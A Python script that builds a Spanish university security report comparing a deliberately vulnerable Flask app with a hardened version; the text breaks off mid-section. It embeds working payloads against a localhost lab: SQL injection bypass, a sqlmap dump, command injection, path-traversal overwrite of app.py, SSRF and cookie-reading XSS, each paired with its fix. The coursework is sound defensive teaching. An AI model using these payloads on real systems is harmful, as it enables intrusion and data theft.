from docx import Document
from docx.shared import Pt, Inches, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
from docx.oxml import OxmlElement


def add_paragraph(doc, text, bold=False, italic=False, alignment=None,
                  space_after=Pt(6), font_size=Pt(12), first_line_indent=None):
    p = doc.add_paragraph()
    run = p.add_run(text)
    run.font.size = font_size
    run.font.name = 'Times New Roman'
    run.bold = bold
    run.italic = italic
    if alignment:
        p.alignment = alignment
    p.paragraph_format.space_after = space_after
    p.paragraph_format.line_spacing = 1.5
    if first_line_indent:
        p.paragraph_format.first_line_indent = first_line_indent
    return p


def add_heading_apa(doc, text, level=1):
    p = doc.add_paragraph()
    run = p.add_run(text)
    run.font.name = 'Times New Roman'
    run.bold = True
    if level == 1:
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run.font.size = Pt(14)
        p.paragraph_format.space_before = Pt(18)
        p.paragraph_format.space_after = Pt(12)
    elif level == 2:
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run.font.size = Pt(12)
        p.paragraph_format.space_before = Pt(12)
        p.paragraph_format.space_after = Pt(6)
    elif level == 3:
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run.font.size = Pt(12)
        run.italic = True
        p.paragraph_format.space_before = Pt(6)
        p.paragraph_format.space_after = Pt(6)
    p.paragraph_format.line_spacing = 1.5
    return p


def add_code_block(doc, code, label=""):
    if label:
        p = doc.add_paragraph()
        run = p.add_run(label)
        run.font.size = Pt(10)
        run.font.name = 'Courier New'
        run.bold = True
        p.paragraph_format.line_spacing = 1.0

    for line in code.split('\n'):
        p = doc.add_paragraph()
        run = p.add_run(line)
        run.font.size = Pt(9)
        run.font.name = 'Courier New'
        pf = p.paragraph_format
        pf.left_indent = Cm(1.27)
        pf.space_before = Pt(0)
        pf.space_after = Pt(0)
        pf.line_spacing = 1.0
    return p


def add_figure_label(doc, label):
    p = doc.add_paragraph()
    run = p.add_run(label)
    run.font.size = Pt(10)
    run.font.name = 'Times New Roman'
    run.italic = True
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.paragraph_format.space_before = Pt(6)
    p.paragraph_format.space_after = Pt(12)
    return p


def add_table_label(doc, label):
    p = doc.add_paragraph()
    run = p.add_run(label)
    run.font.size = Pt(10)
    run.font.name = 'Times New Roman'
    run.italic = True
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.paragraph_format.space_before = Pt(6)
    p.paragraph_format.space_after = Pt(12)
    return p


def add_note(doc, text):
    p = doc.add_paragraph()
    run = p.add_run('Nota. ')
    run.font.size = Pt(10)
    run.font.name = 'Times New Roman'
    run.italic = True
    run2 = p.add_run(text)
    run2.font.size = Pt(10)
    run2.font.name = 'Times New Roman'
    run2.italic = True
    p.paragraph_format.space_after = Pt(12)
    return p


def create_table(doc, headers, data):
    table = doc.add_table(rows=1 + len(data), cols=len(headers))
    table.style = 'Light Grid Accent 1'
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = h
        for paragraph in cell.paragraphs:
            for run in paragraph.runs:
                run.font.bold = True
                run.font.size = Pt(11)
                run.font.name = 'Times New Roman'

    for row_idx, row_data in enumerate(data, 1):
        for col_idx, val in enumerate(row_data):
            table.rows[row_idx].cells[col_idx].text = val
            for paragraph in table.rows[row_idx].cells[col_idx].paragraphs:
                for run in paragraph.runs:
                    run.font.size = Pt(11)
                    run.font.name = 'Times New Roman'

    return table


def C(*lines):
    return '\n'.join(lines)


def add_vuln(doc, num, titulo, owasps, cwes, criticidad, endpoint, causa, impacto,
             repro_label, repro_lines, evid_lines, fix_lines, fix_note=""):
    add_heading_apa(doc, f'{num} {titulo}', level=3)

    create_table(doc,
        ['Campo', 'Detalle'],
        [
            ('Identificador', f'VUL-{num.split(".")[1].split(" ")[0]}' if len(num.split(".")) > 1 else titulo),
            ('Categoria OWASP', owasps),
            ('CWE (MITRE)', cwes),
            ('Criticidad', criticidad),
            ('Endpoint / ruta', endpoint),
            ('Causa raiz', causa),
            ('Impacto', impacto),
        ])
    add_table_label(doc, f'Tabla {num.replace(".", "")[1:]}. Ficha tecnica de {titulo}')

    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(*repro_lines), label='Comando/payload:')
    add_figure_label(doc, f'Evidencia VUL-{num} - reproduccion del ataque')

    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(*evid_lines), label='Salida real:')
    add_figure_label(doc, f'Evidencia VUL-{num} - resultado de la explotacion')

    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(*fix_lines), label='Control implementado (V2):')
    if fix_note:
        add_note(doc, fix_note)


def create_report():
    doc = Document()

    style = doc.styles['Normal']
    font = style.font
    font.name = 'Times New Roman'
    font.size = Pt(12)
    style.paragraph_format.space_after = Pt(6)
    style.paragraph_format.line_spacing = 1.5

    sections = doc.sections
    for section in sections:
        section.top_margin = Cm(2.54)
        section.bottom_margin = Cm(2.54)
        section.left_margin = Cm(2.54)
        section.right_margin = Cm(2.54)

    # ================================================================
    # PORTADA
    # ================================================================
    for _ in range(3):
        doc.add_paragraph()

    add_paragraph(doc, 'UNIVERSIDAD NACIONAL AGRARIA DE LA SELVA',
                  bold=True, alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(14))
    add_paragraph(doc, 'FACULTAD DE INGENIERIA EN INFORMATICA Y SISTEMAS',
                  bold=True, alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(12))
    add_paragraph(doc, 'ESCUELA PROFESIONAL DE INGENIERIA EN INFORMATICA Y SISTEMAS',
                  bold=True, alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(11))

    doc.add_paragraph()
    doc.add_paragraph()

    add_paragraph(doc,
        'Documento Tecnico de Seguridad\n'
        'Sistema Academico de Gestion - V1 insegura vs V2 asegurada',
        bold=True, alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(14))

    doc.add_paragraph()
    doc.add_paragraph()

    add_paragraph(doc, 'Alumno: Zelaya Albornoz, Anali Amy',
                  alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(12))
    doc.add_paragraph()
    add_paragraph(doc, 'IS040704B: Seguridad Informatica',
                  bold=True, alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(12))
    add_paragraph(doc, 'Docente: Mg. Ramos Estela, Juan',
                  alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(12))
    add_paragraph(doc, 'Semestre: 2026 - I',
                  alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(12))
    add_paragraph(doc, 'Tingo Maria - Peru',
                  alignment=WD_ALIGN_PARAGRAPH.CENTER, font_size=Pt(12))

    doc.add_page_break()

    # ================================================================
    # CONTENIDO
    # ================================================================
    add_heading_apa(doc, 'Contenido', level=1)
    contenido = [
        '1. Identificacion del documento',
        '2. Descripcion del TOE y arquitectura',
        '3. Alcance y herramientas utilizadas',
        '4. Matriz de amenazas, vulnerabilidades y evidencia',
        '5. Vulnerabilidades con evidencia',
        '   5.1 VUL-01 SQL Injection - bypass de autenticacion (login)',
        '   5.2 VUL-02 SQL Injection - UNION query y dump con sqlmap',
        '   5.3 VUL-03 RCE - Command Injection en /diagnostico',
        '   5.4 VUL-04 RCE - subida de archivo con path traversal',
        '   5.5 VUL-05 SSRF - /estudiantes/importar-foto y /cursos/importar-silabo',
        '   5.6 VUL-06 XSS Almacenado - filtro |safe y upload de .html',
        '   5.7 VUL-07 Broken Access Control - escalada a /admin/usuarios',
        '   5.8 VUL-08 CSRF - eliminaciones por GET',
        '   5.9 VUL-09 Fallas criptograficas - passwords en texto plano',
        '   5.10 VUL-10 Componentes vulnerables - CVE-2024-34069 (Werkzeug 3.0.1)',
        '   5.11 VUL-11 Security Misconfiguration - debug=True y trazas expuestas',
        '   5.12 VUL-12 Fuerza bruta sin limite - ausencia de rate limiting',
        '   5.13 VUL-13 Fallas de logging y monitoreo',
        '6. Verificacion de la V2 (bloqueo de los ataques)',
        '7. Resumen de resultados',
        '8. Conclusiones y recomendaciones',
        '9. Referencias normativas',
        'Anexo A. Comandos utilizados',
    ]
    for item in contenido:
        p = doc.add_paragraph()
        run = p.add_run(item)
        run.font.size = Pt(11)
        run.font.name = 'Times New Roman'
        p.paragraph_format.space_after = Pt(2)
        if not item.startswith('   '):
            run.bold = True

    doc.add_page_break()

    # ================================================================
    # 1. IDENTIFICACION DEL DOCUMENTO
    # ================================================================
    add_heading_apa(doc, '1. Identificacion del documento', level=2)

    create_table(doc,
        ['Campo', 'Valor'],
        [
            ('Titulo', 'Documento Tecnico de Seguridad - Sistema Academico de Gestion'),
            ('Norma de referencia', 'ISO/IEC 15408:2022 (Common Criteria), Partes 1, 2 y 3'),
            ('Metodologia de evaluacion', 'ISO/IEC 18045:2022 (evaluacion de seguridad, clase AVA_VAN)'),
            ('Objeto de evaluacion (TOE)', 'Aplicacion web academica V2 (asegurada)'),
            ('Escenario de referencia', 'V1 deliberadamente vulnerable - rama v1-insegura / carpeta v1/'),
            ('Alcance', 'Analisis comparado de seguridad V1 vs V2 con pruebas de penetracion'),
            ('Fecha de evaluacion', '2026-08-01'),
            ('Clasificacion', 'Confidencial - uso exclusivamente academico'),
        ])
    add_table_label(doc, 'Tabla 1. Identificacion del documento tecnico')

    add_paragraph(doc,
        'Este documento presenta el analisis de seguridad de una aplicacion web '
        'academica construida en dos versiones: la V1 (insegura), que contiene '
        'vulnerabilidades deliberadas de OWASP Top 10 2021, y la V2 (asegurada), '
        'que las corrige mediante practicas de desarrollo seguro. La evaluacion '
        'se documenta siguiendo la estructura de un Security Target (ISO/IEC '
        '15408) y los resultados de las pruebas de penetracion se presentan '
        'como evidencia tecnica reproducible.',
        first_line_indent=Cm(1.27))

    # ================================================================
    # 2. DESCRIPCION DEL TOE Y ARQUITECTURA
    # ================================================================
    add_heading_apa(doc, '2. Descripcion del TOE y arquitectura', level=2)

    add_paragraph(doc,
        'El TOE es la aplicacion web academica V2 (gestion de estudiantes, cursos, '
        'notas y archivos). La V1 es el escenario de referencia que materializa '
        'las amenazas del entorno. El cuadro siguiente contrasta el stack de cada '
        'version.',
        first_line_indent=Cm(1.27))

    create_table(doc,
        ['Componente', 'V1 (insegura)', 'V2 (asegurada)'],
        [
            ('Backend', 'Flask 3.0.3 + Werkzeug 3.0.1', 'Flask + Gunicorn 23.0.0 (3 workers)'),
            ('Base de datos', 'SQLite, passwords en texto plano', 'SQLite, bcrypt (cost factor 12)'),
            ('Transporte', 'HTTP plano (puerto 5001)', 'HTTPS TLS 1.2/1.3 via Nginx (puerto 443)'),
            ('Sesion', "secret_key hardcodeada '12345', cookies sin flags", 'secret en .env, cookies HttpOnly/SameSite/Secure'),
            ('Queries', 'Concatenacion de strings (SQLi)', 'Queries parametrizadas (?)'),
            ('Subida de archivos', 'Sin validacion, nombre original', 'Whitelist ext + MIME + magic bytes, fuera del webroot'),
            ('Control de acceso', 'Sin RBAC (docente = admin)', 'RBAC con @admin_required, docente solo lectura'),
            ('Errores', 'debug=True, tracebacks expuestos', 'Paginas 403/404/500 sin trazas'),
            ('Protecciones', 'Sin CSRF, sin rate limit, sin headers', 'CSRF tokens, rate limit + lockout, headers de seguridad'),
            ('Testing', 'Ninguno', 'pytest (59 tests de seguridad)'),
        ])
    add_table_label(doc, 'Tabla 2. Comparativa del stack tecnico V1 vs V2')

    add_paragraph(doc, 'Topologia de despliegue (Docker Compose):', bold=True)
    add_code_block(doc,
        C(
            'Host (Docker Compose)',
            '+-- red "web" (aislada)',
            '|   +-- sistema_nginx :80/:443  ->  TLS (OpenSSL), redirect HTTP->HTTPS, HSTS',
            '|   |       proxy_pass http://sistema_v2:5000',
            '|   +-- sistema_v2 :5000  ->  Gunicorn + Flask + SQLite (V2 segura)',
            '|',
            '+-- red "lab" (aislada)',
            '|   +-- sistema_v1 :5001  ->  Flask dev, debug=True (V1 insegura)',
            '|   +-- sqlmap (profile "attack", on-demand)',
            '+-- db/  ->  bases de datos versionadas (db/v1.db, db/v2.db)',
        ),
        label='Diagrama de topologia:')

    add_figure_label(doc, 'Figura 1. Arquitectura de despliegue de ambas versiones')

    # ================================================================
    # 3. ALCANCE Y HERRAMIENTAS
    # ================================================================
    add_heading_apa(doc, '3. Alcance y herramientas utilizadas', level=2)

    add_paragraph(doc,
        'Las pruebas se realizaron sobre el despliegue local de la V1 '
        '(http://localhost:5001) y de la V2 (https://localhost). Todas las '
        'pruebas sobre la V2 son no destructivas (no escriben datos).',
        first_line_indent=Cm(1.27))

    create_table(doc,
        ['Herramienta', 'Version', 'Uso'],
        [
            ('sqlmap', '1.10.7', 'SQLi automatizado, dump de la tabla usuarios'),
            ('curl', '8.x', 'Peticiones manuales HTTP/HTTPS y verificacion'),
            ('verificar_v2.ps1/.sh', '1.0', '12 probes no destructivos contra la V2'),
            ('pytest', '7.x', '59 tests automatizados de seguridad de la V2'),
            ('nmap', '7.x', 'Fingerprinting de puertos/servicios'),
            ('Safety / Bandit', 'SCA/SAST', 'Verificacion de dependencias y codigo (documentado)'),
        ])
    add_table_label(doc, 'Tabla 3. Herramientas utilizadas en la evaluacion')

    # ================================================================
    # 4. MATRIZ AMENAZAS / VULNERABILIDADES / EVIDENCIA
    # ================================================================
    add_heading_apa(doc, '4. Matriz de amenazas, vulnerabilidades y evidencia', level=2)

    add_paragraph(doc,
        'Las amenazas identificadas en el entorno se asocian con las categorias '
        'de OWASP Top 10 2021, los CWE correspondientes y las familias de '
        'requisitos funcionales de seguridad (SFR) de ISO/IEC 15408 Parte 2 '
        'que las contrarrestan en la V2.',
        first_line_indent=Cm(1.27))

    create_table(doc,
        ['Amenaza', 'OWASP Top 10', 'CWE', 'SFR (CC Parte 2)', 'Evidencia'],
        [
            ('T-SQLI Bypass de autenticacion', 'A03', 'CWE-89', 'FIA_UAU (autenticacion)', 'Seccion 5.1'),
            ('T-SQLI Extraccion de datos', 'A03', 'CWE-89', 'FDP_SDI (integridad de datos)', 'Seccion 5.2'),
            ('T-RCE Ejecucion de comandos', 'A03', 'CWE-78', 'FDP_SDI / FPT_ITT', 'Seccion 5.3'),
            ('T-RCE Subida de webshell', 'A03/A08', 'CWE-434, CWE-22', 'FDP_SDI / FDP_UIT', 'Seccion 5.4'),
            ('T-SSRF Acceso a recursos internos', 'A10', 'CWE-918', 'FDP_NET (comunicaciones)', 'Seccion 5.5'),
            ('T-XSS Ejecucion de scripts', 'A08', 'CWE-79', 'FDP_UIT (datos de usuario)', 'Seccion 5.6'),
            ('T-ACL Escalada de privilegios', 'A01', 'CWE-862, CWE-269', 'FDP_ACF (control de acceso)', 'Seccion 5.7'),
            ('T-CSRF Acciones no autorizadas', 'A01', 'CWE-352', 'FDP_ACF / FIA_UAU', 'Seccion 5.8'),
            ('T-CRYPTO Credenciales expuestas', 'A02', 'CWE-256, CWE-798', 'FCS_CKM / FCS_COP', 'Seccion 5.9'),
            ('T-COMP Componentes vulnerables', 'A06', 'CWE-1104', '(aseguramiento, no funcional)', 'Seccion 5.10'),
            ('T-MISCONF Trazas y debug', 'A05', 'CWE-209', 'FPT_SDI / FAU_SAR', 'Seccion 5.11'),
            ('T-BRUTE Fuerza bruta', 'A04/A07', 'CWE-307', 'FIA_AFL (fallas de autenticacion)', 'Seccion 5.12'),
            ('T-LOGGING Ausencia de auditoria', 'A09', 'CWE-778', 'FAU_GEN (generacion de auditoria)', 'Seccion 5.13'),
        ])
    add_table_label(doc, 'Tabla 4. Matriz de amenazas, vulnerabilidades y evidencia')

    doc.add_page_break()

    # ================================================================
    # 5. VULNERABILIDADES CON EVIDENCIA
    # ================================================================
    add_heading_apa(doc, '5. Vulnerabilidades con evidencia', level=2)

    add_paragraph(doc,
        'Cada vulnerabilidad se documenta con una ficha tecnica, el comando '
        'exacto de reproduccion y la evidencia real obtenida durante la prueba. '
        'Los ataques se ejecutaron contra la V1 en http://localhost:5001.',
        first_line_indent=Cm(1.27))

    # ---- 5.1 VUL-01 SQLi login
    add_heading_apa(doc, '5.1 VUL-01 SQL Injection - bypass de autenticacion (login)', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-01'),
            ('Categoria OWASP', 'A03 - Injection'),
            ('CWE (MITRE)', 'CWE-89'),
            ('Criticidad', 'Critica'),
            ('Endpoint / ruta', 'POST /login (app.py)'),
            ('Causa raiz', "Concatenacion directa del parametro username en la sentencia SQL"),
            ('Impacto', 'Acceso al sistema sin credenciales validas'),
        ])
    add_table_label(doc, 'Tabla 5. Ficha tecnica VUL-01')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        'curl -s -X POST http://localhost:5001/login \\',
        '  -d "username=admin\' OR \'1\'=\'1\' --&password=x"',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-01 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        'HTTP/1.1 302 FOUND',
        'Location: /dashboard',
        'Set-Cookie: session=...; HttpOnly; Path=/',
        '',
        '# Consulta SQL resultante en el servidor:',
        "SELECT * FROM usuarios WHERE username='admin' OR '1'='1' -- ' AND password='x'",
    ), label='Salida real:')
    add_figure_label(doc, 'Evidencia VUL-01 - sesion iniciada como admin sin password valida')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        'cursor.execute("SELECT * FROM usuarios WHERE username = ?", (username,))',
        '# 59 tests verifican que el payload no produce bypass (200, sin redirect)',
    ), label='Control implementado (V2):')
    add_note(doc, 'Verificacion V2 (probe 3): POST con el mismo payload responde 200 en el login, sin redireccion al dashboard.')

    # ---- 5.2 VUL-02 SQLi UNION + sqlmap
    add_heading_apa(doc, '5.2 VUL-02 SQL Injection - UNION query y dump con sqlmap', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-02'),
            ('Categoria OWASP', 'A03 - Injection'),
            ('CWE (MITRE)', 'CWE-89'),
            ('Criticidad', 'Critica'),
            ('Endpoint / ruta', 'GET /estudiantes?buscar= (app.py)'),
            ('Causa raiz', 'Concatenacion del parametro buscar en la consulta de listado'),
            ('Impacto', 'Extraccion completa de la base de datos (dump)'),
        ])
    add_table_label(doc, 'Tabla 6. Ficha tecnica VUL-02')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        'sqlmap -u "http://localhost:5001/estudiantes?buscar=test" \\',
        '  --cookie="session=<cookie_valida>" --batch --flush-session \\',
        '  --technique=U --level=2 --risk=2 -T usuarios --dump \\',
        '  --output-dir=docs/sqlmap_evidence/estudiantes',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-02 - sqlmap 1.10.7 contra la busqueda')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        "sqlmap identified the following injection point(s) with a total of 27 HTTP(s) requests:",
        "Parameter: buscar (GET)",
        "    Type: UNION query",
        "    Title: Generic UNION query (NULL) - 5 columns",
        "back-end DBMS: SQLite",
        "Database: <current>",
        "Table: usuarios",
        "[2 entries]",
        "+----+---------+----------+----------+",
        "| id | rol     | password | username |",
        "+----+---------+----------+----------+",
        "| 1  | admin   | admin123 | admin    |",
        "| 2  | docente | profesor | profesor |",
        "+----+---------+----------+----------+",
    ), label='Salida real (docs/sqlmap_evidence/estudiantes/localhost/log):')
    add_figure_label(doc, 'Evidencia VUL-02 - dump de la tabla usuarios')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        'cursor.execute("SELECT * FROM estudiantes WHERE nombre LIKE ?", (f"%{buscar}%",))',
        '# Probe 9 V2: UNION SELECT no filtra hashes bcrypt (0 coincidencias 2b$12)',
    ), label='Control implementado (V2):')
    add_note(doc, 'La V1 detectada con boolean-based blind (POST /login) y UNION query (GET /estudiantes). En la V2 el mismo payload no inyecta.')

    # ---- 5.3 VUL-03 RCE
    add_heading_apa(doc, '5.3 VUL-03 RCE - Command Injection en /diagnostico', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-03'),
            ('Categoria OWASP', 'A03 - Injection'),
            ('CWE (MITRE)', 'CWE-78'),
            ('Criticidad', 'Critica'),
            ('Endpoint / ruta', 'POST /diagnostico (app.py)'),
            ('Causa raiz', 'subprocess.run(comando, shell=True) con entrada sin sanear'),
            ('Impacto', 'Ejecucion arbitraria de comandos en el servidor'),
        ])
    add_table_label(doc, 'Tabla 7. Ficha tecnica VUL-03')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# Windows (cmd.exe):',
        'curl -b cookies.txt --data-urlencode "host=127.0.0.1 & whoami" \\',
        '  http://localhost:5001/diagnostico',
        '',
        '# Linux/Docker (sh):',
        'curl -b cookies.txt --data-urlencode "host=127.0.0.1; whoami" \\',
        '  http://localhost:5001/diagnostico',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-03 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        'Acceso denegado. La opcion -c requiere privilegios administrativos.',
        '',
        'asus\\alebo        <- salida de whoami, ejecutado despues del separador &',
    ), label='Salida real (whoami ejecutado):')
    add_figure_label(doc, 'Evidencia VUL-03 - ejecucion de whoami en el servidor')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        'ALLOWED = {"fecha", "hostname", "sistema"}',
        'if comando not in ALLOWED:',
        '    return "Comando no permitido (solo: fecha, hostname, sistema)"',
        'subprocess.run([comando], shell=False, capture_output=True, text=True)',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probe 7 V2: enviar whoami responde "Comando no permitido", sin salida de comandos.')

    # ---- 5.4 VUL-04 RCE upload
    add_heading_apa(doc, '5.4 VUL-04 RCE - subida de archivo con path traversal', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-04'),
            ('Categoria OWASP', 'A03 / A08'),
            ('CWE (MITRE)', 'CWE-434, CWE-22'),
            ('Criticidad', 'Critica'),
            ('Endpoint / ruta', 'POST /archivos/subir (app.py)'),
            ('Causa raiz', 'secure_filename importado pero deliberadamente no usado'),
            ('Impacto', 'Sobrescritura de app.py + recarga y ejecucion de codigo (webshell)'),
        ])
    add_table_label(doc, 'Tabla 8. Ficha tecnica VUL-04')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# payload.py - codigo que se inyecta como app.py:',
        'import subprocess',
        "with open('PWNED.txt', 'w') as f:",
        "    f.write(subprocess.getoutput('whoami'))",
        '',
        '# Subida con traversal de dos niveles (static/uploads -> raiz del proyecto):',
        'curl -b cookies.txt \\',
        '  -F "archivo=@payload.py;filename=../../app.py;type=text/x-python" \\',
        '  http://localhost:5001/archivos/subir',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-04 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '* Detected change in \'.../app.py\', reloading',
        '# El servidor recarga y ejecuta el contenido subido.',
        '# Aparece PWNED.txt en la raiz con la salida de whoami.',
    ), label='Salida real (log del servidor):')
    add_figure_label(doc, 'Evidencia VUL-04 - recarga de Werkzeug tras sobrescribir app.py')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        'EXT_ALLOWED = {"pdf", "png", "jpg", "jpeg", "txt"}',
        'if ext not in EXT_ALLOWED: return "Tipo de archivo no permitido"',
        'nombre = str(uuid.uuid4()) + secure_filename(ext)',
        'archivo.save(os.path.join(UPLOAD_DIR, nombre))  # fuera del webroot',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probe 10 V2: subir un .html malicioso responde "Tipo de archivo no permitido". Este PoC es destructivo y se documento sin ejecutar sobre el repositorio real.')

    # ---- 5.5 VUL-05 SSRF
    add_heading_apa(doc, '5.5 VUL-05 SSRF - /estudiantes/importar-foto y /cursos/importar-silabo', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-05'),
            ('Categoria OWASP', 'A10 - SSRF'),
            ('CWE (MITRE)', 'CWE-918'),
            ('Criticidad', 'Alta'),
            ('Endpoint / ruta', 'POST /estudiantes/importar-foto, POST /cursos/importar-silabo'),
            ('Causa raiz', 'requests.get(url) sobre URL controlada por el cliente, sin allowlist'),
            ('Impacto', 'El servidor accede a servicios internos (loopback, metadata, red interna)'),
        ])
    add_table_label(doc, 'Tabla 9. Ficha tecnica VUL-05')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# 1. Alcanzar recurso interno del propio servidor:',
        'curl -b cookies.txt \\',
        '  --data-urlencode "estudiante_id=1" \\',
        '  --data-urlencode "url=http://127.0.0.1:5001/login" \\',
        '  http://localhost:5001/estudiantes/importar-foto',
        '',
        '# 2. SSRF ciego hacia un host interno inexistente (puerto 9999):',
        'curl -b cookies.txt --data-urlencode "curso_id=1" \\',
        '  --data-urlencode "url=http://10.0.0.99:9999/" \\',
        '  http://localhost:5001/cursos/importar-silabo',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-05 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '# Caso 1: el servidor descarga su propio /login y lo guarda como "foto"',
        '(foto_est1_usuarios en la base) - prueba de acceso a loopback.',
        '',
        '# Caso 2: al no haber try/except, Werkzeug devuelve el traceback con',
        'requests.exceptions.ConnectionError - permite escaneo de puertos via',
        'errores diferenciados (SSRF ciego basado en errores).',
    ), label='Salida real (comportamiento observado):')
    add_figure_label(doc, 'Evidencia VUL-05 - acceso a loopback y traceback de ConnectionError')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '# /importar: se bloquean IPs no publicas (RFC1918, loopback, link-local)',
        '# y se prohiben las redirecciones HTTP.',
        'if es_privada(url): return "URL no permitida", 403',
    ), label='Control implementado (V2):')
    add_note(doc, 'Probe 8 V2: URLs a 169.254.169.254 (metadata), localhost y 192.168.1.1 devuelven 403 en los tres casos.')

    # ---- 5.6 VUL-06 XSS
    add_heading_apa(doc, '5.6 VUL-06 XSS Almacenado - filtro |safe y upload de .html', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-06'),
            ('Categoria OWASP', 'A08 - Software and Data Integrity Failures'),
            ('CWE (MITRE)', 'CWE-79'),
            ('Criticidad', 'Alta'),
            ('Endpoint / ruta', 'POST /notas/crear (vector observaciones); /archivos/subir + /static/uploads'),
            ('Causa raiz', 'Filtro |safe en templates/notas.html; static/uploads sirve .html sin restriccion'),
            ('Impacto', 'Ejecucion de JavaScript en sesion de otros usuarios (robo de cookies, escalada)'),
        ])
    add_table_label(doc, 'Tabla 10. Ficha tecnica VUL-06')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        '# Vector 1 - campo observaciones renderizado con |safe:',
        'curl -b cookies.txt \\',
        '  --data-urlencode "estudiante_id=1" --data-urlencode "curso_id=1" \\',
        '  --data-urlencode "nota=15" --data-urlencode "ciclo=2026-I" \\',
        '  --data-urlencode "observaciones=<script>alert(1)</script>" \\',
        '  http://localhost:5001/notas/crear',
        '',
        '# Vector 2 - subir un .html malicioso y servirlo en el mismo dominio:',
        "echo '<script>alert(document.cookie)</script>' > malicioso.html",
        'curl -b cookies.txt -F "archivo=@malicioso.html" http://localhost:5001/archivos/subir',
    ), label='Comando/payload:')
    add_figure_label(doc, 'Evidencia VUL-06 - reproduccion del ataque')
    add_paragraph(doc, 'Evidencia obtenida:', bold=True)
    add_code_block(doc, C(
        '# templates/notas.html (V1):',
        "<td>{{ nota.observaciones|safe if nota.observaciones else '' }}</td>",
        '',
        '# Al abrir /notas, el <script> se renderiza y ejecuta sin escapar:',
        '<script>alert(1)</script>',
    ), label='Salida real (HTML renderizado):')
    add_figure_label(doc, 'Evidencia VUL-06 - script renderizado sin escapar')
    add_paragraph(doc, 'Correccion aplicada en la V2:', bold=True)
    add_code_block(doc, C(
        '# Auto-escaping de Jinja2 (sin |safe) + Content Security Policy:',
        "response.headers['Content-Security-Policy'] = \\",
        "    \"default-src 'self'; style-src 'self' 'unsafe-inline' cdn.jsdelivr.net\"",
        'response.headers["X-Content-Type-Options"] = "nosniff"',
    ), label='Control implementado (V2):')
    add_note(doc, 'En la V2, los uploads .html se rechazan por extension/MIME y los archivos se descargan como as_attachment (no se ejecutan).')

    # ---- 5.7 VUL-07 ACL
    add_heading_apa(doc, '5.7 VUL-07 Broken Access Control - escalada a /admin/usuarios', level=3)
    create_table(doc, ['Campo', 'Detalle'],
        [
            ('Identificador', 'VUL-07'),
            ('Categoria OWASP', 'A01 - Broken Access Control'),
            ('CWE (MITRE)', 'CWE-862, CWE-269'),
            ('Criticidad', 'Critica'),
            ('Endpoint / ruta', 'GET /admin/usuarios, /estudiantes/eliminar/1, /cursos/crear'),
            ('Causa raiz', 'session["rol"] se guarda pero ningun endpoint lo verifica'),
            ('Impacto', 'Un docente accede al panel de administracion y ve las passwords en plano'),
        ])
    add_table_label(doc, 'Tabla 11. Ficha tecnica VUL-07')
    add_paragraph(doc, 'Reproduccion:', bold=True)
    add_code_block(doc, C(
        'curl -c cookies_doc.txt -d "username=profesor&password=profesor" \\',
        '  http://localhost:5001/login',
        'curl -b cookies_doc.txt http://localhost:5001/admin/usuarios',
